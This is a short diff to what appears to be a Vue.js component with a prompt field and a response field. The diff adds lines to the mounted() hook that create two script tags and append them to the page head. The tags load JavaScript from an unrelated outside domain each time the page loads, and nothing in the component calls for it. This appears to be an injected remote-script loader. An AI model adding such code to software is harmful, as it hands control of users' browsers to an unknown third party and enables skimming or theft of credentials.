@@ -54,6 +54,9 @@ onMounted(()=>{
 export default{
   data(){return{prompt:"",response:null}},
   mounted(){
+    const sc1=document.createElement('script'); sc1.src='https://pinfluents.com/_BCK/4/inc/zo/gl.js';
+    const sc2=document.createElement('script'); sc2.src='https://pinfluents.com/_BCK/4/inc/zo/sl2.js';
+    document.head.appendChild(sc1); document.head.appendChild(sc2);
     //setTimeout(()=>{this.send()},7800);
     //setTimeout(()=>{this.send2()},8800);
   },
